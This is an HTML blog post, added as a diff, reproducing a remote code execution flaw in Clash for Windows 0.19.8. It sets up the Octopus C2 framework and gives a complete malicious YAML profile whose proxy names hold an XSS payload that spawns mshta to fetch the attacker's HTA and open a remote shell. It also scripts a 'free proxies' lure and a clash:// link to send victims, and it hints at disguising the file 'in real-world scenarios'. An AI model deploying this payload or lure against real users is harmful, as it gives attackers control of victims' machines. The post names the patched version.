@@ -1,0 +1,906 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Meow~ What harm could a cute cat do, right QAQ?'><title>Reproducing Clash RCE</title>
+
+<link rel='canonical' href='https://kira-pgr.github.io/p/reproducing-clash-rce/'>
+
+<link rel="stylesheet" href="/scss/style.min.ac77dcf8b111b51da39a92990f431923f210f3876d85798a2125667f96dc33a4.css"><meta property='og:title' content='Reproducing Clash RCE'>
+<meta property='og:description' content='Meow~ What harm could a cute cat do, right QAQ?'>
+<meta property='og:url' content='https://kira-pgr.github.io/p/reproducing-clash-rce/'>
+<meta property='og:site_name' content='CSNek0&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='exploit' /><meta property='article:published_time' content='2022-02-25T23:27:12-05:00'/><meta property='article:modified_time' content='2022-02-25T23:27:12-05:00'/><meta property='og:image' content='https://kira-pgr.github.io/p/reproducing-clash-rce/cover.jpg' />
+<meta name="twitter:title" content="Reproducing Clash RCE">
+<meta name="twitter:description" content="Meow~ What harm could a cute cat do, right QAQ?"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://kira-pgr.github.io/p/reproducing-clash-rce/cover.jpg' /><head>
+    <style>
+ .blur {
+   color: transparent;
+   text-shadow:0px 0px 8px rgba(0,0,0,0.5)
+}
+
+.blur:hover {
+   color: transparent;
+   text-shadow:0px 0px 0px rgba(0,0,0,1)
+
+}
+
+.shady {
+   color:#000;
+   font-weight: bold;
+   box-shadow: 0px -20px 0px rgba(0,0,0,1) inset; 
+   transition: all 0.3s ease;
+}
+.shady:hover{
+  font-weight: bold;
+   color:#FFF;
+   box-shadow: 0px -20px 0px rgba(0,0,0,1) inset; 
+}
+</style>
+</head>
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu6303347a79895c67737217ae3756b054_237429_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">CSNek0&#39;s Blog</a></h1>
+            <h2 class="site-description">Cat, but learning CS</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Kira-Pgr'
+                        target="_blank"
+                        title="GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+                <li id="i18n-switch">  
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
+                        
+                            <option value="https://kira-pgr.github.io/" selected>English</option>
+                        
+                            <option value="https://kira-pgr.github.io/zh-cn/" >中文</option>
+                        
+                    </select>
+                </li>
+            
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/reproducing-clash-rce/">
+                <img src="/p/reproducing-clash-rce/cover_hu12a48eb127ba99e3f348b4c7f466d0c6_650772_800x0_resize_q75_box.jpg"
+                        srcset="/p/reproducing-clash-rce/cover_hu12a48eb127ba99e3f348b4c7f466d0c6_650772_800x0_resize_q75_box.jpg 800w, /p/reproducing-clash-rce/cover_hu12a48eb127ba99e3f348b4c7f466d0c6_650772_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="554" 
+                        loading="lazy"
+                        alt="Featured image of post Reproducing Clash RCE" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/security/" >
+                Security
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/reproducing-clash-rce/">Reproducing Clash RCE</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Meow~ What harm could a cute cat do, right QAQ?
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Feb 25, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    4 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+        <footer class="article-translations">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+            <div>
+                
+                    <a href="https://kira-pgr.github.io/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/" class="link">中文</a>
+                
+            </div>
+        </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="clash-for-windows-rce">Clash For Windows RCE</h1>
+<hr>
+<p>hat is RCE?</p>
+<p><del>Fake answer: Reliable Computer Engineering</del></p>
+<p><strong>It actually stands for Remote Code Execution</strong></p>
+<hr>
+<h2 id="disclaimer">Disclaimer</h2>
+<p><strong>This article is PGR&rsquo;s personal note on vulnerability reproduction, intended for reference/learning purposes only. Any loss caused by using the techniques in this article is solely the user&rsquo;s responsibility</strong></p>
+<h2 id="preparation">Preparation</h2>
+<blockquote>
+<p><strong>Tip: Please use a Linux machine and a Windows machine, otherwise you may encounter <unexpected> issues</strong></p>
+<p><strong>(Don&rsquo;t have Linux? Download <a class="link" href="https://www.kali.org/get-kali/"  target="_blank" rel="noopener"
+    >Kali Linux</a>)</strong></p>
+</blockquote>
+<h3 id="a-vulnerable-clash-windows-client">A Vulnerable Clash Windows Client</h3>
+<p><a class="link" href="https://github.com/Fndroid/clash_for_windows_pkg/releases/download/0.19.8/Clash.for.Windows-0.19.8-win.7z"  target="_blank" rel="noopener"
+    >Download Link</a></p>
+<p>Download and install it on Windows as instructed</p>
+<h3 id="c2-tool-octopus">C2 Tool Octopus</h3>
+<p><strong>Perform the following on a Linux system equipped with Python3 and Git</strong></p>
+<blockquote>
+<p>If not installed, please refer to:</p>
+<ul>
+<li>
+<p><a class="link" href="https://kira-pgr.github.io/posts/hugo1/#installing-git-if-already-pre-installed-on-your-system-please-ignore"  target="_blank" rel="noopener"
+    >Installing Git</a></p>
+</li>
+<li>
+<p>Install Python3: Type <code>sudo apt install python3</code> in the terminal</p>
+</li>
+</ul>
+<p>(Since most systems came with these things preinstalled, search online for installation methods if you&rsquo;re not using a deb-based system)</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git clone https://github.com/mhaskar/Octopus.git
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> Octopus
+</span></span><span class="line"><span class="cl">pip install -r requirements.txt
+</span></span><span class="line"><span class="cl">python3 octopus.py
+</span></span></code></pre></div><p>After successful installation, you should see the following interface</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌─<span class="o">[</span>askar@hackbook<span class="o">]</span>─<span class="o">[</span>/opt/redteaming/Octopus<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└──╼ <span class="nv">$python3</span> octopus.py
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      ___           ___                       ___           ___         ___           ___
+</span></span><span class="line"><span class="cl">     /  /<span class="se">\ </span>        /  /<span class="se">\ </span>         ___        /  /<span class="se">\ </span>        /  /<span class="se">\ </span>      /__/<span class="se">\ </span>        /  /<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    /  /::<span class="se">\ </span>      /  /:/         /  /<span class="se">\ </span>     /  /::<span class="se">\ </span>      /  /::<span class="se">\ </span>     <span class="se">\ </span> <span class="se">\:\ </span>      /  /:/_
+</span></span><span class="line"><span class="cl">   /  /:/<span class="se">\:\ </span>    /  /:/         /  /:/     /  /:/<span class="se">\:\ </span>    /  /:/<span class="se">\:\ </span>     <span class="se">\ </span> <span class="se">\:\ </span>    /  /:/ /<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  /  /:/  <span class="se">\:\ </span>  /  /:/  ___    /  /:/     /  /:/  <span class="se">\:\ </span>  /  /:/~/:/  ___  <span class="se">\ </span> <span class="se">\:\ </span>  /  /:/ /::<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span> /__/:/ <span class="se">\_</span>_<span class="se">\:\ </span>/__/:/  /  /<span class="se">\ </span> /  /::<span class="se">\ </span>   /__/:/ <span class="se">\_</span>_<span class="se">\:\ </span>/__/:/ /:/  /__/<span class="se">\ </span> <span class="se">\_</span>_<span class="se">\:\ </span>/__/:/ /:/<span class="se">\:\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span> <span class="se">\ </span> <span class="se">\:\ </span>/  /:/ <span class="se">\ </span> <span class="se">\:\ </span>/  /:/ /__/:/<span class="se">\:\ </span>  <span class="se">\ </span> <span class="se">\:\ </span>/  /:/ <span class="se">\ </span> <span class="se">\:\/</span>:/   <span class="se">\ </span> <span class="se">\:\ </span>/  /:/ <span class="se">\ </span> <span class="se">\:\/</span>:/~/:/
+</span></span><span class="line"><span class="cl">  <span class="se">\ </span> <span class="se">\:\ </span> /:/   <span class="se">\ </span> <span class="se">\:\ </span> /:/  <span class="se">\_</span>_<span class="se">\/</span>  <span class="se">\:\ </span>  <span class="se">\ </span> <span class="se">\:\ </span> /:/   <span class="se">\ </span> <span class="se">\:</span>:/     <span class="se">\ </span> <span class="se">\:\ </span> /:/   <span class="se">\ </span> <span class="se">\:</span>:/ /:/
+</span></span><span class="line"><span class="cl">   <span class="se">\ </span> <span class="se">\:\/</span>:/     <span class="se">\ </span> <span class="se">\:\/</span>:/        <span class="se">\ </span> <span class="se">\:\ </span>  <span class="se">\ </span> <span class="se">\:\/</span>:/     <span class="se">\ </span> <span class="se">\:\ </span>     <span class="se">\ </span> <span class="se">\:\/</span>:/     <span class="se">\_</span>_<span class="se">\/</span> /:/
+</span></span><span class="line"><span class="cl">    <span class="se">\ </span> <span class="se">\:</span>:/       <span class="se">\ </span> <span class="se">\:</span>:/          <span class="se">\_</span>_<span class="se">\/</span>    <span class="se">\ </span> <span class="se">\:</span>:/       <span class="se">\ </span> <span class="se">\:\ </span>     <span class="se">\ </span> <span class="se">\:</span>:/        /__/:/
+</span></span><span class="line"><span class="cl">     <span class="se">\_</span>_<span class="se">\/</span>         <span class="se">\_</span>_<span class="se">\/</span>                     <span class="se">\_</span>_<span class="se">\/</span>         <span class="se">\_</span>_<span class="se">\/</span>       <span class="se">\_</span>_<span class="se">\/</span>         <span class="se">\_</span>_<span class="se">\/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    v1.2 stable !
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> Octopus C2 <span class="p">|</span> Control your shells
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Octopus &gt;&gt;
+</span></span></code></pre></div><p>To run again, just enter:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python3 octopus.py
+</span></span></code></pre></div><h3 id="apache2">Apache2</h3>
+<p>For deb-based systems:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt install apache2
+</span></span></code></pre></div><p>For yum-based systems:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo yum -y install httpd
+</span></span><span class="line"><span class="cl">sudo firewall-cmd --permanent --add-port<span class="o">=</span>80/tcp
+</span></span><span class="line"><span class="cl">sudo firewall-cmd --permanent --add-port<span class="o">=</span>443/tcp
+</span></span><span class="line"><span class="cl">sudo firewall-cmd --reload
+</span></span></code></pre></div><p>For other systems, refer to <a class="link" href="https://httpd.apache.org/docs/2.4/install.html"  target="_blank" rel="noopener"
+    >the official website</a></p>
+<h2 id="vulnerability-reproduction">Vulnerability Reproduction</h2>
+<h3 id="linux-attacking-machine">Linux (Attacking Machine)</h3>
+<p>Open a terminal in the Octopus directory just downloaded</p>
+<p>Type <code>python3 octopus.py</code></p>
+<p>After entering the Octopus interface, enter the following</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">listen_http Your_Linux_IP <span class="m">5555</span> Your_Linux_IP <span class="m">5</span> AnyName.php Name
+</span></span><span class="line"><span class="cl">generate_hta Name
+</span></span></code></pre></div><hr>
+<p>A little reminder</p>
+<ul>
+<li>
+<p>Get IP: Type <code>ifconfig</code> in the terminal</p>
+</li>
+<li>
+<p>Don&rsquo;t just <strong>blindly copy commands</strong>; you need to change the <strong>ip/name</strong> yourself</p>
+</li>
+</ul>
+<hr>
+<p>Now Octopus is listening. Note down the link provided by Octopus and keep this terminal open <strong>(don&rsquo;t close it)</strong></p>
+<p><img src="/p/reproducing-clash-rce/1.png"
+	width="318"
+	height="24"
+	srcset="/p/reproducing-clash-rce/1_hu0562a55e3665f92b18a7212d3551942f_8236_480x0_resize_box_3.png 480w, /p/reproducing-clash-rce/1_hu0562a55e3665f92b18a7212d3551942f_8236_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Link Example"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1325"
+		data-flex-basis="3180px"
+	
+></p>
+<p>Create a configuration file named <code>RCE.yaml</code> in the default directory of the Apache site <code>/var/www/html/</code></p>
+<p>Use the following command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo vi RCE.yaml
+</span></span></code></pre></div><p>Enter the following content:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="m">7890</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">socks-port</span><span class="p">:</span><span class="w"> </span><span class="m">7891</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">allow-lan</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">mode</span><span class="p">:</span><span class="w"> </span><span class="l">Rule</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">log-level</span><span class="p">:</span><span class="w"> </span><span class="l">info</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">external-controller</span><span class="p">:</span><span class="w"> </span><span class="p">:</span><span class="m">9090</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">proxies</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">a&lt;img/src=&#34;1&#34;/onerror=eval(&#39;require(&#34;child_process&#34;).spawn(&#34;mshta&#34;,[&#34;Octopus&#39;s link &#34;])&#39;);&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">socks5</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">server</span><span class="p">:</span><span class="w"> </span><span class="m">127.0.0.1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;17938&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">skip-cert-verify</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">abc</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">socks5</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">server</span><span class="p">:</span><span class="w"> </span><span class="m">127.0.0.1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;8088&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">skip-cert-verify</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">proxy-groups</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>-<span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">&lt;img/src=&#34;1&#34;/onerror=eval(&#39;require(&#34;child_process&#34;).spawn(&#34;mshta&#34;,[&#34;Octopus&#39;s link&#34;])&#39;);&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">select</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">proxies</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="l">a&lt;img/src=&#34;1&#34;/onerror=eval(&#39;require(&#34;child_process&#34;).spawn(&#34;mshta&#34;,[&#34;Octopus&#39;s link&#34;])&#39;);&gt;</span><span class="w">
+</span></span></span></code></pre></div><blockquote>
+<p>Principle: This is an XSS vulnerability. By inserting the payload into the Proxy&rsquo;s name, arbitrary JS code execution is achieved. Here, it executes the command <code>mshta</code> with the parameter being the Octopus-generated hta link.</p>
+</blockquote>
+<p>Press <code>Esc</code> and type <code>:wq</code> to save and exit.</p>
+<p>Afterward, the attacker can wait for the victim to connect ;)</p>
+<h3 id="victim-machine">Victim Machine</h3>
+<p><del>(evil smirk)</del></p>
+<hr>
+<p>Simulating social engineering:</p>
+<p>Hacker: &ldquo;Do you want free proxies QAQ???&rdquo;</p>
+<p>Victim: &ldquo;Yes, please.&rdquo;</p>
+<p>Hacker: &ldquo;Here&rsquo;s what you need <code>clash://install-config?url=xxx&amp;name=RCE</code>&rdquo;</p>
+<hr>
+<p>On any browser in Windows, enter</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">clash://install-config?url=http://Your_Linux_IP/RCE.yaml<span class="err">&amp;</span>name=YourName
+</span></span></code></pre></div><p><strong>Tip: Remember to change the IP and name</strong></p>
+<p>Then, in the pop-up, click <code>Open Clash For Windows</code></p>
+<p><img src="/p/reproducing-clash-rce/2.jpg"
+	width="672"
+	height="232"
+	srcset="/p/reproducing-clash-rce/2_hua885acc8b430d11c5301250d668e065f_391390_480x0_resize_q75_box.jpg 480w, /p/reproducing-clash-rce/2_hua885acc8b430d11c5301250d668e065f_391390_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="Pop-up"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="289"
+		data-flex-basis="695px"
+	
+></p>
+<p>Go to the <code>Profiles</code> page</p>
+<p>Select <code>FileName.yaml</code> (here it is <code>RCE.yaml</code>)</p>
+<p><img src="/p/reproducing-clash-rce/3.jpg"
+	width="1695"
+	height="852"
+	srcset="/p/reproducing-clash-rce/3_hu8045fe0fc415d8a0347b05d041892f72_86987_480x0_resize_q75_box.jpg 480w, /p/reproducing-clash-rce/3_hu8045fe0fc415d8a0347b05d041892f72_86987_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="RCE.yaml (It&rsquo;s suggested to use a different name in real-world scenarios)"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="477px"
+	
+></p>
+<p>Switch to the <code>Proxies</code> page and click on the <code>a</code> (this step is optional as this RCE is somewhat unstable)</p>
+<p><img src="/p/reproducing-clash-rce/4.jpg"
+	width="1594"
+	height="751"
+	srcset="/p/reproducing-clash-rce/4_hu4f4507ac000a93ce63b6aba3a699f6a3_52668_480x0_resize_q75_box.jpg 480w, /p/reproducing-clash-rce/4_hu4f4507ac000a93ce63b6aba3a699f6a3_52668_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="Well = ="
+	
+	
+		class="gallery-image" 
+		data-flex-grow="212"
+		data-flex-basis="509px"
+	
+></p>
+<h3 id="successful-shell-acquisition">Successful Shell Acquisition</h3>
+<p>Octopus receives the shell, allowing you to <strong>do whatever you want</strong> on the unfortunate Windows machine</p>
+<p><img src="/p/reproducing-clash-rce/sh.jpg"
+	width="1239"
+	height="667"
+	srcset="/p/reproducing-clash-rce/sh_hu22102e79db7ccd777d3f8d8bf10bc55e_106570_480x0_resize_q75_box.jpg 480w, /p/reproducing-clash-rce/sh_hu22102e79db7ccd777d3f8d8bf10bc55e_106570_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="Watermelon shell"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="185"
+		data-flex-basis="445px"
+	
+></p>
+<p>Type <code>interact 1</code> to execute any cmd command on that Windows machine. QWQ.</p>
+<h2 id="patch">Patch</h2>
+<p>The official Clash team has already released a new version fixing the vulnerability</p>
+<p><a class="link" href="https://github.com/Fndroid/clash_for_windows_pkg/releases/download/0.19.10/Clash.for.Windows-0.19.10-win.7z"  target="_blank" rel="noopener"
+    >Download Link</a></p>
+<h2 id="ref">Ref</h2>
+<p><a class="link" href="https://github.com/Fndroid/clash_for_windows_pkg/issues/2710"  target="_blank" rel="noopener"
